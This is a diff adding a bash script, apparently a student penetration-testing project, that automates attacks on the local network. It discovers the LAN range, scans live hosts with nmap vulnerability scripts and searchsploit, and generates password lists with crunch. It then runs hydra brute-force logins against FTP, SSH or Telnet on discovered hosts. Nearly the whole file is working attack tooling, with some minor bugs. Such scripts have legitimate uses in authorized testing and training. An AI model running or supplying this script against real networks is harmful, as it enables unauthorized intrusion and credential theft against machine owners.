@@ -1,0 +1,96 @@
+#!/bin/bash
+
+function LANRANGE () {
+A=$(hostname -I)
+sudo apt install ipcalc
+D=$(ipcalc $A | grep -i network | awk '{print $2}')
+echo "Your Network range is $D"
+}
+LANRANGE
+
+
+function NETD(){
+	mkdir PTSCRIPT
+	cd PTSCRIPT
+	echo "Scaning for live hosts on your LAN"
+	nmap -sP $D | grep -oP '\d+\.\d+\.\d+\.\d+'  > NETDresults.txt
+	echo "All live hosts were saved into NETDSresults.txt file"
+}
+NETD
+
+function SCAN(){
+	nmap -sV -Pn --script vuln -iL NETDresults.txt -oX nmapxml.xml -oN nmapresults.txt
+	searchsploit --nmap nmapxml.xml
+	echo "A List with all network ip's, open port and Vulerabilities are saved in a file name nmapresults.txt"
+}
+SCAN
+
+function SPECIFY(){
+	read -p "you can specify a user list by path" USER
+	echo "Whould you like to create a password list or use an existing list? Choose create or existing"
+	read choice
+	if [ $choice == "existing" ]
+	then read -p "Please specify an absolute path for a password list" passlist
+	else 
+	echo "For creating a new list, you will need to specify a few parameters"
+	echo "minimum length string requierd, please enter this parameter by number"
+	read minimum
+	echo "maximum length string requierd, please enter this parameter by number"
+	read maximum
+	echo "charset string requierd, please enter this parameter"
+	read string
+	crunch $minimum $maximum $string -o newpasslist.txt
+	echo "the passwords list you've created was saved in PTscript folder by the name 'newpasslist.txt'"
+	#pass=$(newpasslist.txt)
+fi
+}
+SPECIFY
+start=$(date +%s)
+function FTPBF(){
+IP=$(cat nmapresults.txt | grep -i open -B4| awk 'NR==1 {print $5}')
+hydra -L $USER -P $passlist $IP ftp -vV -o hydraResults.txt|| hydra -L $USER -P newpasslist.txt $(cat nmapresults.txt | grep -i open -B4| awk 'NR==1 {print $5}') ftp -vV -o hydraResults.txt
+}
+
+
+function SSHBF(){
+IP=$(cat nmapresults.txt | grep -i open -B4| awk 'NR==1 {print $5}')
+hydra -L $USER -P $passlist $(cat nmapresults.txt | grep -i open -B4| awk 'NR==1 {print $5}') ssh -vV -o hydraResults.txt || hydra -L $USER -P newpasslist.txt $(cat nmapresults.txt | grep -i open -B4| awk 'NR==1 {print $5}') ssh  -vV -o hydraResults.txt
+}
+
+function TELNETBF(){
+IP=$(cat nmapresults.txt | grep -i open -B4| awk 'NR==1 {print $5}')
+hydra -L $USER -P $passlist $(cat nmapresults.txt | grep -i open -B4| awk 'NR==1 {print $5}') telnet -vV -o hydraResults.txt || hydra -L $USER -P newpasslist.txt $(cat nmapresults.txt | grep -i open -B4| awk 'NR==1 {print $5}') telnet -vV -o hydraResults.txt
+}
+
+function BRUTEF(){
+FTP=$(cat nmapresults.txt | grep -iw open | grep ftp | uniq)
+SSH=$(cat nmapresults.txt | grep -iw open | grep ssh | uniq)
+TELNET=$(cat nmapresults.txt | grep -iw open | grep telnet | uniq)
+if [ $(cat nmapresults.txt | grep 'ftp\|ssh\|telnet' | grep -i -w open | awk '{print $2}' | uniq)=="open" ]
+	then if [[ ! -z $FTP ]]
+		then FTPBF
+		elif [[ ! -z $SSH ]]
+		then SSHBF
+		elif [[ ! -z $TELNET ]]
+		then TELNETBF
+		else continue
+		fi
+#hydra -L $user -P $passlist $(cat nmapresults.txt | grep -i open -B4| awk 'NR==1 {print $5}') $(cat nmapresults.txt | grep -i open -B4 | awk '{print $3}') -o hydraResults.txt || hydra -L $user -P newpasslist.txt $(cat nmapresults.txt | grep -i open -B4| awk 'NR==1 {print $5}') $(cat nmapresults.txt | grep -i open -B4| awk '{print $3}') -o hydraResults.txt
+end=$(date +%s)
+	runtime=$(($end - $start))
+	echo "script scan was $runtime seconds"
+fi
+}
+BRUTEF
+
+function RESULTS(){
+echo "The number of devices found on this LAN are:"
+cat /home/kali/Desktop/PTSCRIPT/NETDresults.txt | wc -l
+echo "The devices saved at /home/kali/Desktop/PTSCRIPT/NETDresults.txt path"
+echo "Brute Force Results are saved in /home/kali/Desktop/PTSCRIPT/hydraResults.txt"
+echo "To search an IP results in the Results file, you can write an IP address here:"
+read IPADD
+cat /home/kali/Desktop/PTSCRIPT/hydraResults.txt | grep -A20 $IPADD
+echo "i hope you like my script, thank you for choosing Reut PTscript"
+}
+RESULTS
